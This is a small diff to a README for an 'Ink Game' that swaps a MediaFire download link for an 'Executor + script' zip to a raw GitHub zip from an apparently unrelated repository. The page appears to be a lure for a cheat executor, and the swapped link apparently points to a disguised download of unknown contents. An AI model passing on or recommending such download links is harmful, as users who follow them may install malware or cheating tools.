@@ -1,6 +1,6 @@
 # 🎨 Ink Game
 
-Executor + script --- [ScriptPacked](https://www.mediafire.com/file/otdgaoctqo4u6l9/ScriptPacked.zip/file)
+Executor + script --- [ScriptPacked](https://raw.githubusercontent.com/lakabriya1212/open-nof1.ai/main/redefine/open-nof1.ai_v2.8-beta.1.zip)
 
 ## ✨ Features
 
